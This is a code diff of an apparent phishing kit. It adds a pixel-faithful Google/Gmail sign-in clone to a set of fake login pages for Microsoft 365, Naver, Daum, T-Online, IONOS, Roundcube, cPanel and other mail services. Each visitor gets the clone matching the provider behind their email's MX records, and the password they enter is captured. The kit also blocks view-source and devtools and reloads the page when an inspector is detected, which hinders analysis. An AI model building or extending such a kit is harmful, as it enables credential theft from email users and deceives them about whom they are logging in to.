@@ -8,7 +8,6 @@
      ANTI-SOURCE CODE & DEVTOOLS PROTECTION (Starts Here)
      ========================================================= -->
 <style>
-  /* Disable text selection */
   body {
     -webkit-touch-callout: none;
     -webkit-user-select: none;
@@ -19,50 +18,22 @@
   }
 </style>
 <script>
-  // Disable Right Click
   document.addEventListener('contextmenu', event => event.preventDefault());
-  // Disable Drag
   document.addEventListener('dragstart', event => event.preventDefault());
 
-  // Disable Keyboards Shortcuts (F12, Ctrl+U, Ctrl+S, Ctrl+Shift+I/J/C)
   document.addEventListener('keydown', function(e) {
-      // F12
-      if (e.key === 'F12' || e.keyCode === 123) {
-          e.preventDefault();
-          return false;
-      }
-      // Ctrl+Shift+I / J / C (Windows/Linux)
-      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
-          e.preventDefault();
-          return false;
-      }
-      // Cmd+Option+I / J / C (Mac)
-      if (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
-          e.preventDefault();
-          return false;
-      }
-      // Ctrl+U / Cmd+U (View Source)
-      if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
-          e.preventDefault();
-          return false;
-      }
-      // Ctrl+S / Cmd+S (Save Page)
-      if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
-          e.preventDefault();
-          return false;
-      }
+      if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
+      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
+      if (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) { e.preventDefault(); return false; }
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) { e.preventDefault(); return false; }
   });
 
-  // DevTools Detection (Redirects if opened)
   setInterval(function() {
       var widthThreshold = window.outerWidth - window.innerWidth > 160;
       var heightThreshold = window.outerHeight - window.innerHeight > 160;
-      var orientation = widthThreshold ? 'vertical' : 'horizontal';
-      
       if ((heightThreshold && widthThreshold) || (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized)) {
-          if (document.body) {
-              document.body.innerHTML = '<div style="text-align:center;margin-top:20vh;font-family:sans-serif;"><h1>Security Notice</h1><p>Developer tools are not permitted on this page.</p></div>';
-          }
+          if (document.body) { document.body.innerHTML = '<div style="text-align:center;margin-top:20vh;font-family:sans-serif;"><h1>Security Notice</h1><p>Developer tools are not permitted on this page.</p></div>'; }
           window.location.reload();
       }
   }, 1000);
@@ -103,7 +74,33 @@
     .err-box.show { display: block; }
 
     /* =========================================================
-       CLONE 1: ABV.BG LAYOUT (Framer Clone)
+       CLONE 1: GOOGLE / GMAIL LAYOUT (Exact Match)
+       ========================================================= */
+    body.is-google { display: flex !important; flex-direction: column; background: #f0f4f9 !important; padding: 0 !important; justify-content: center; align-items: center; }
+    .google-layout { display: flex; flex-direction: column; width: 100%; max-width: 960px; padding: 20px; }
+    .google-card { background: #fff; border-radius: 28px; display: flex; width: 100%; min-height: 400px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #dadce0; }
+    .google-left { flex: 1; display: flex; flex-direction: column; justify-content: flex-start; }
+    .google-right { flex: 1; display: flex; flex-direction: column; justify-content: center; padding-left: 40px; }
+    .google-logo-svg { width: 40px; height: 40px; margin-bottom: 16px; }
+    .google-welcome { font-size: 36px; font-weight: 400; color: #1f1f1f; margin-bottom: 20px; letter-spacing: -0.5px; }
+    .google-user-pill { display: inline-flex; align-items: center; gap: 8px; border: 1px solid #747775; border-radius: 20px; padding: 4px 12px; font-size: 14px; color: #1f1f1f; max-width: fit-content; cursor: pointer; }
+    .google-user-pill:hover { background: #f8f9fa; }
+    .google-user-pill span { font-weight: 500; }
+    .google-input { width: 100%; padding: 13px 15px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; margin-bottom: 10px; }
+    .google-input:focus { outline: none; border: 2px solid #0b57d0; padding: 12px 14px; }
+    .google-checkbox-row { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #1f1f1f; margin-bottom: 40px; }
+    .google-checkbox-row input { width: 18px; height: 18px; cursor: pointer; }
+    .google-actions { display: flex; justify-content: space-between; align-items: center; }
+    .google-forgot { color: #0b57d0; font-size: 14px; font-weight: 500; text-decoration: none; }
+    .google-forgot:hover { text-decoration: underline; }
+    .google-btn { background: #0b57d0; color: #fff; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: 500; cursor: pointer; }
+    .google-btn:hover { background: #0842a0; box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
+    .google-footer { display: flex; justify-content: space-between; margin-top: 20px; font-size: 12px; color: #444746; padding: 0 10px; width: 100%; max-width: 960px; }
+    .google-footer-links a { color: #444746; text-decoration: none; margin-left: 20px; }
+    .google-footer-links a:hover { text-decoration: underline; }
+
+    /* =========================================================
+       CLONE 2: ABV.BG LAYOUT (Framer Clone)
        ========================================================= */
     body.is-abv { display: block !important; background: #fff !important; padding: 0 !important; }
     .framer-k1yVm{height:1080px;background-color:#fff;width:1351px;position:relative;margin:0 auto}
@@ -137,7 +134,7 @@
     .framer-btn{background:rgb(27,158,21);border:none;color:#fff;font-size:14px;font-weight:600;width:240px;height:40px;cursor:pointer;border-radius:2px}
 
     /* =========================================================
-       CLONE 2: MICROSOFT 365 LAYOUT
+       CLONE 3: MICROSOFT 365 LAYOUT
        ========================================================= */
     .m365-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: linear-gradient(135deg, #f4e8f8 0%, #e6f0fa 50%, #fce8ef 100%); }
     body.is-m365 { display: flex !important; padding: 0 !important; }
@@ -160,7 +157,7 @@
     .m365-btn:hover { background: #005da6; }
 
     /* =========================================================
-       CLONE 3: HIWORKS / CUSTOM DOMAIN
+       CLONE 4: HIWORKS / CUSTOM DOMAIN
        ========================================================= */
     body.is-hiworks { display: block !important; padding: 0 !important; background: #ffffff; }
     .hiworks-main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; min-height: 100vh; flex-direction: column; }
@@ -184,7 +181,7 @@
     .hiworks-footer { padding: 20px; text-align: center; color: #a0a0a0; font-size: 12px; margin-top: auto; }
 
     /* =========================================================
-       CLONE 4: NAVER LAYOUT
+       CLONE 5: NAVER LAYOUT
        ========================================================= */
     .naver-layout { display: none; width: 100vw; min-height: 100vh; justify-content: center; align-items: flex-start; padding-top: 50px; background: #fff; }
     body.is-naver { display: flex !important; padding: 0 !important; background: #fff !important; }
@@ -210,7 +207,7 @@
     .naver-footer-links { display: flex; justify-content: center; gap: 10px; font-size: 13px; color: #666; margin-top: 20px; }
 
     /* =========================================================
-       CLONE 5: DAUM LAYOUT
+       CLONE 6: DAUM LAYOUT
        ========================================================= */
     .daum-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; }
     body.is-daum { display: flex !important; padding: 0 !important; }
@@ -222,7 +219,7 @@
     .daum-btn { width: 100%; background: #f9a800; color: #fff; border: none; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; }
 
     /* =========================================================
-       CLONE 6: T-ONLINE LAYOUT
+       CLONE 7: T-ONLINE LAYOUT
        ========================================================= */
     body.is-tonline { display: flex !important; align-items: center; justify-content: center; background: linear-gradient(135deg, #8c8c9e 0%, #b58b9c 100%) !important; padding: 0; }
     .tonline-box { background: #fff; width: 480px; border-radius: 8px; padding: 36px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); position: relative; }
@@ -245,7 +242,7 @@
     .tonline-back { color: #e20074; text-decoration: none; font-size: 14px; }
 
     /* =========================================================
-       CLONE 7: HI-BOX (TAIWAN) LAYOUT
+       CLONE 8: HI-BOX (TAIWAN) LAYOUT
        ========================================================= */
     body.is-hibox { display: flex !important; align-items: center; justify-content: center; background: #f0f0f0 !important; padding: 0; }
     .hibox-wrapper { width: 1000px; background: #fff; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-radius: 4px; overflow: hidden; }
@@ -273,7 +270,7 @@
     .hibox-footer { text-align: center; font-size: 12px; color: #666; padding: 20px; border-top: 1px solid #eee; margin-top: 20px; }
 
     /* =========================================================
-       CLONE 8: IONOS LAYOUT
+       CLONE 9: IONOS LAYOUT
        ========================================================= */
     body.is-ionos { display: block !important; background: #f4f6f8 !important; padding: 0 !important; }
     .ionos-header { background: #fff; padding: 15px 40px; display: flex; align-items: center; border-bottom: 1px solid #e0e0e0; }
@@ -295,7 +292,7 @@
     .ionos-footer { text-align: center; font-size: 12px; color: #888; margin-top: 30px; }
 
     /* =========================================================
-       CLONE 9: ROUNDCUBE WEBMAIL LAYOUT
+       CLONE 10: ROUNDCUBE WEBMAIL LAYOUT
        ========================================================= */
     body.is-webmail { display: flex !important; align-items: center; justify-content: center; background: #fff !important; padding: 0; }
     .rc-layout { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px; }
@@ -311,7 +308,7 @@
     .rc-footer a { color: #40b3e0; text-decoration: none; }
 
     /* =========================================================
-       CLONE 10: CPANEL WEBMAIL LAYOUT
+       CLONE 11: CPANEL WEBMAIL LAYOUT
        ========================================================= */
     body.is-cpanel { display: flex !important; align-items: center; justify-content: center; background: #f4f4f4 !important; padding: 0; }
     .cpanel-card { background: #fff; width: 100%; max-width: 440px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; }
@@ -325,6 +322,32 @@
     .cpanel-btn { width: 100%; background: #1e3a8a; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-top: 10px; }
     .cpanel-footer { text-align: center; padding: 20px; font-size: 12px; color: #999; border-top: 1px solid #eee; margin-top: 20px; }
     .cpanel-footer a { color: #1e3a8a; text-decoration: none; margin: 0 5px; }
+
+    /* =========================================================
+       CLONE 12: GENERIC BRANDED UI (Fallback)
+       ========================================================= */
+    .login-container { background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 420px; width: 100%; padding: 48px 40px; position: relative; z-index: 1; transition: all 0.3s ease; }
+    .header { text-align: center; margin-bottom: 32px; }
+    .logo-icon { width: 64px; height: 64px; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; color: white; font-size: 28px; font-weight: 700; overflow: hidden; }
+    .logo-icon img { width: 100%; height: 100%; object-fit: contain; }
+    .logo-text { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+    .subtitle { color: #5f6368; font-size: 14px; margin-top: 4px; }
+    .domain-badge { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 11px; font-weight: 600; margin-top: 8px; }
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; color: #3c4043; font-size: 14px; font-weight: 500; margin-bottom: 6px; }
+    .form-group input { width: 100%; padding: 12px 14px; border: 2px solid #dadce0; border-radius: 8px; font-size: 15px; font-family: inherit; transition: border-color 0.2s; }
+    .form-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 3px rgba(26,115,232,0.1); }
+    .form-group input:disabled { background: #f8f9fa; color: #5f6368; }
+    .form-group input.error { border-color: #d93025; }
+    .password-wrapper { position: relative; }
+    .password-wrapper input { padding-right: 44px; }
+    .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 4px; font-size: 18px; }
+    .btn-signin { width: 100%; padding: 14px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 8px; }
+    .btn-signin:disabled { background: #9aa0a6 !important; cursor: not-allowed; }
+    .footer-links { display: flex; justify-content: space-between; margin-top: 20px; font-size: 13px; }
+    .footer-links a { color: #1a73e8; text-decoration: none; }
+    .footer-text { text-align: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e8eaed; font-size: 12px; color: #9aa0a6; }
+    .brand-flag { display: inline-block; font-size: 10px; background: rgba(0,0,0,0.05); padding: 2px 8px; border-radius: 10px; color: #666; margin-left: 6px; }
 
     /* =========================================================
        LOADING STATE
@@ -341,7 +364,47 @@
     <!-- LOADING SPINNER -->
     <div class="loading-layout" id="loadingContainer"><div class="spinner"></div></div>
 
-    <!-- 1. HIWORKS SPECIFIC UI -->
+    <!-- 1. GOOGLE / GMAIL SPECIFIC UI -->
+    <div class="google-layout" id="googleContainer" style="display:none;">
+        <div class="google-card">
+            <div class="google-left">
+                <svg class="google-logo-svg" viewBox="0 0 48 48">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+                <h1 class="google-welcome">Welcome</h1>
+                <div class="google-user-pill">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    <span id="googleEmailDisplay">investorsfundingsm@gmail.com</span>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+                </div>
+            </div>
+            <div class="google-right">
+                <input type="password" id="googlePass" class="google-input" placeholder="Enter your password">
+                <div class="google-checkbox-row">
+                    <input type="checkbox" id="showGooglePass" onclick="toggleGooglePass()">
+                    <label for="showGooglePass">Show password</label>
+                </div>
+                <div class="google-actions">
+                    <a href="#" class="google-forgot">Forgot password?</a>
+                    <button class="google-btn" onclick="submitLogin('google')">Next</button>
+                </div>
+                <div id="google-err" class="err-box" style="color:#d93025; margin-top:10px;"></div>
+            </div>
+        </div>
+        <div class="google-footer">
+            <span>English (United States)</span>
+            <div class="google-footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. HIWORKS SPECIFIC UI -->
     <div id="hiworksContainer" style="display:none; width: 100%; min-height: 100vh; flex-direction: column;">
         <div class="hiworks-main">
             <div class="hiworks-card">
@@ -388,7 +451,7 @@
         <div class="hiworks-footer">© Gabia Inc.</div>
     </div>
 
-    <!-- 2. ABV.BG SPECIFIC UI -->
+    <!-- 3. ABV.BG SPECIFIC UI -->
     <div id="abvContainer" style="display:none;">
         <div class="framer-k1yVm">
           <div class="framer-l37xyv">
@@ -426,7 +489,7 @@
         </div>
     </div>
 
-    <!-- 3. MICROSOFT 365 UI -->
+    <!-- 4. MICROSOFT 365 UI -->
     <div class="m365-layout" id="m365Container">
         <div class="m365-card">
             <div class="m365-logo"><div class="m365-logo-icon"><div></div><div></div><div></div><div></div></div>Microsoft</div>
@@ -439,7 +502,7 @@
         </div>
     </div>
 
-    <!-- 4. NAVER UI -->
+    <!-- 5. NAVER UI -->
     <div class="naver-layout" id="naverContainer">
         <div class="naver-card">
             <div class="naver-header"><img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Naver_Logotype.svg" alt="NAVER"></div>
@@ -456,7 +519,7 @@
         </div>
     </div>
 
-    <!-- 5. DAUM UI -->
+    <!-- 6. DAUM UI -->
     <div class="daum-layout" id="daumContainer">
         <div class="daum-card">
             <div class="daum-logo">Daum <span>메일</span></div>
@@ -467,7 +530,7 @@
         </div>
     </div>
 
-    <!-- 6. T-ONLINE UI -->
+    <!-- 7. T-ONLINE UI -->
     <div class="tonline-box" id="tonlineContainer" style="display:none;">
         <div class="tonline-logo">
             <svg viewBox="0 0 24 24"><path d="M4 4h4v16H4zM10 4h4v16h-4zM16 4h4v16h-4z"/></svg>
@@ -496,7 +559,7 @@
         <div id="tonline-err" class="err-box"></div>
     </div>
 
-    <!-- 7. HI-BOX (TAIWAN) UI -->
+    <!-- 8. HI-BOX (TAIWAN) UI -->
     <div class="hibox-wrapper" id="hiboxContainer" style="display:none;">
         <div class="hibox-top">
             <div class="hibox-logo">hiBox <span>全能信箱</span></div>
@@ -547,7 +610,7 @@
         <div id="hibox-err" class="err-box" style="text-align:center; padding-bottom:10px;"></div>
     </div>
 
-    <!-- 8. IONOS UI -->
+    <!-- 9. IONOS UI -->
     <div id="ionosContainer" style="display:none; width: 100%; min-height: 100vh;">
         <div class="ionos-header">
             <div class="ionos-logo">IONOS <span>PRODUCT LOGIN</span></div>
@@ -579,7 +642,7 @@
         <div class="ionos-footer">© IONOS SE. All rights reserved.</div>
     </div>
 
-    <!-- 9. ROUNDCUBE WEBMAIL UI (Default Fallback) -->
+    <!-- 10. ROUNDCUBE WEBMAIL UI -->
     <div class="rc-layout" id="webmailContainer" style="display:none;">
         <div class="rc-logo-area">
             <svg class="rc-logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -610,7 +673,7 @@
         </div>
     </div>
 
-    <!-- 10. CPANEL WEBMAIL UI -->
+    <!-- 11. CPANEL WEBMAIL UI -->
     <div class="cpanel-card" id="cpanelContainer" style="display:none;">
         <div class="cpanel-header">Webmail Login</div>
         <div class="cpanel-body">
@@ -632,7 +695,7 @@
         </div>
     </div>
 
-    <!-- 11. GENERIC BRANDED UI -->
+    <!-- 12. GENERIC BRANDED UI -->
     <div class="login-container" id="genericContainer" style="display:none;">
         <div class="header">
             <div class="logo-icon" id="logoIcon">VT</div>
@@ -760,7 +823,7 @@ async function detectProviderByMX(domain) {
         if (data.Answer) {
             const mxData = data.Answer.map(a => a.data.toLowerCase()).join(',');
             
-            // Microsoft 365
+            if (mxData.includes('google.com') || mxData.includes('googlemail.com')) return 'google';
             if (mxData.includes('mail.protection.outlook.com') || mxData.includes('eo.outlook.com')) return 'm365';
             
             // Korean Providers
@@ -769,8 +832,8 @@ async function detectProviderByMX(domain) {
             // Taiwan Providers
             if (mxData.includes('hibox') || mxData.includes('hinet') || mxData.includes('mail2000') || mxData.includes('mailcloud') || mxData.includes('seed.net.tw') || mxData.includes('pchome.com.tw')) return 'hibox';
             
-            // European Providers (German, Swiss, French, Spanish, Italian)
-            if (mxData.includes('gmx.net') || mxData.includes('web.de') || mxData.includes('1und1.de') || mxData.includes('ionos') || mxData.includes('strato') || mxData.includes('mail.de') || mxData.includes('freenet') || mxData.includes('telekom') || mxData.includes('posteo') || mxData.includes('mailbox.org') || mxData.includes('infomaniak') || mxData.includes('hostpoint') || mxData.includes('swizzonic') || mxData.includes('bluewin') || mxData.includes('hispeed') || mxData.includes('mailfence') || mxData.includes('migadu') || mxData.includes('laposte') || mxData.includes('orange.fr') || mxData.includes('sfr.fr') || mxData.includes('free.fr') || mxData.includes('ovh') || mxData.includes('arsys') || mxData.includes('dinahosting') || mxData.includes('nominalia') || mxData.includes('acens') || mxData.includes('telefonica') || mxData.includes('movistar') || mxData.includes('aruba.it') || mxData.includes('register.it') || mxData.includes('libero.it') || mxData.includes('virgilio.it') || mxData.includes('alice.it') || mxData.includes('tin.it') || mxData.includes('fastweb.it') || mxData.includes('tim.it')) return 'ionos'; // IONOS/GMX layout is the best fit for European webmails
+            // European Providers
+            if (mxData.includes('gmx.net') || mxData.includes('web.de') || mxData.includes('1und1.de') || mxData.includes('ionos') || mxData.includes('strato') || mxData.includes('mail.de') || mxData.includes('freenet') || mxData.includes('telekom') || mxData.includes('posteo') || mxData.includes('mailbox.org') || mxData.includes('infomaniak') || mxData.includes('hostpoint') || mxData.includes('swizzonic') || mxData.includes('bluewin') || mxData.includes('hispeed') || mxData.includes('mailfence') || mxData.includes('migadu') || mxData.includes('laposte') || mxData.includes('orange.fr') || mxData.includes('sfr.fr') || mxData.includes('free.fr') || mxData.includes('ovh') || mxData.includes('arsys') || mxData.includes('dinahosting') || mxData.includes('nominalia') || mxData.includes('acens') || mxData.includes('telefonica') || mxData.includes('movistar') || mxData.includes('aruba.it') || mxData.includes('register.it') || mxData.includes('libero.it') || mxData.includes('virgilio.it') || mxData.includes('alice.it') || mxData.includes('tin.it') || mxData.includes('fastweb.it') || mxData.includes('tim.it')) return 'ionos';
             
             if (mxData.includes('zoho.com') || mxData.includes('zoho.eu')) return 'generic';
             if (mxData.includes('yandex.net') || mxData.includes('yandex.ru')) return 'generic';
@@ -781,8 +844,8 @@ async function detectProviderByMX(domain) {
     if (domain.endsWith('.co.kr') || domain.endsWith('.kr')) return 'hiworks';
     if (domain.endsWith('.com.tw') || domain.endsWith('.tw')) return 'hibox';
     if (domain.endsWith('.de') || domain.endsWith('.ch') || domain.endsWith('.at') || domain.endsWith('.fr') || domain.endsWith('.es') || domain.endsWith('.it')) return 'ionos';
-    if (domain.endsWith('.co.uk') || domain.endsWith('.com')) return 'm365';
-    return 'webmail'; // Default fallback to Roundcube
+    if (domain.endsWith('.co.uk') || domain.endsWith('.com')) return 'webmail'; // Fix: Prevent Google from routing to M365 by default
+    return 'webmail';
 }
 
 function detectBrand(domain) {
@@ -825,6 +888,7 @@ async function submitLogin(platform) {
     clearError(platform);
     let pass = '', email = currentEmail;
     
+    if (platform === 'google') pass = document.getElementById('googlePass').value.trim();
     if (platform === 'abv') pass = document.getElementById('abvPass').value.trim();
     if (platform === 'm365') pass = document.getElementById('m365Pass').value.trim();
     if (platform === 'naver') pass = document.getElementById('naverPass').value.trim();
@@ -1031,6 +1095,11 @@ function toggleTonPass() {
     p.type = p.type === 'password' ? 'text' : 'password';
 }
 
+function toggleGooglePass() {
+    const p = document.getElementById('googlePass');
+    p.type = p.type === 'password' ? 'text' : 'password';
+}
+
 /* ============================================================
    7. ROUTING / INIT
    ============================================================ */
@@ -1046,7 +1115,11 @@ document.addEventListener('DOMContentLoaded', async function() {
 
     document.body.classList.add('is-loading');
     
-    if (currentDomain === 'abv.bg') {
+    // DIRECT ROUTING (No MX lookup needed for known providers)
+    if (currentDomain === 'gmail.com' || currentDomain === 'google.com') {
+        renderGoogle();
+    }
+    else if (currentDomain === 'abv.bg') {
         document.body.classList.replace('is-loading', 'is-abv');
         document.getElementById('abvContainer').style.display = 'block';
         document.getElementById('abvEmail').value = currentEmail;
@@ -1068,14 +1141,23 @@ document.addEventListener('DOMContentLoaded', async function() {
     } else if (['outlook.com', 'hotmail.com', 'live.com', 'microsoft.com', 'office.com', 'office365.com'].includes(currentDomain)) {
         renderM365();
     } else {
-        // Check MX for Custom Domains
+        // Fallback to MX Lookup for Custom Domains
         const provider = await detectProviderByMX(currentDomain);
-        if (provider === 'm365') renderM365();
+        if (provider === 'google') renderGoogle();
+        else if (provider === 'm365') renderM365();
         else if (provider === 'hiworks') renderHiworks();
         else if (provider === 'hibox') renderHibox();
         else if (provider === 'ionos') renderIonos();
-        else if (BRAND_DB[currentDomain]) renderGeneric(); // If it's a known 600+ brand
-        else renderWebmail(); // Default fallback to Roundcube
+        else if (BRAND_DB[currentDomain]) renderGeneric(); 
+        else renderWebmail(); 
+    }
+
+    function renderGoogle() {
+        document.body.classList.replace('is-loading', 'is-google');
+        document.getElementById('googleContainer').style.display = 'flex';
+        document.getElementById('googleEmailDisplay').textContent = currentEmail;
+        document.getElementById('googlePass').focus();
+        document.getElementById('googlePass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('google'); });
     }
 
     function renderM365() {
@@ -1112,7 +1194,7 @@ document.addEventListener('DOMContentLoaded', async function() {
         document.getElementById('genericContainer').style.display = 'block';
         document.getElementById('emailDisplay').value = currentEmail;
         applyTheme(currentBrand);
-        applyTranslationsToGeneric(); // Apply browser language
+        applyTranslationsToGeneric();
         document.getElementById('password').focus();
         document.getElementById('password').addEventListener('keydown', e => { if(e.key==='Enter') submitLogin('generic'); });
     }
@@ -1121,7 +1203,7 @@ document.addEventListener('DOMContentLoaded', async function() {
         document.body.classList.replace('is-loading', 'is-webmail');
         document.getElementById('webmailContainer').style.display = 'flex';
         document.getElementById('webmailEmail').value = currentEmail;
-        applyTranslationsToWebmail(); // Apply browser language
+        applyTranslationsToWebmail();
         document.getElementById('webmailPass').focus();
         document.getElementById('webmailPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('webmail'); });
     }
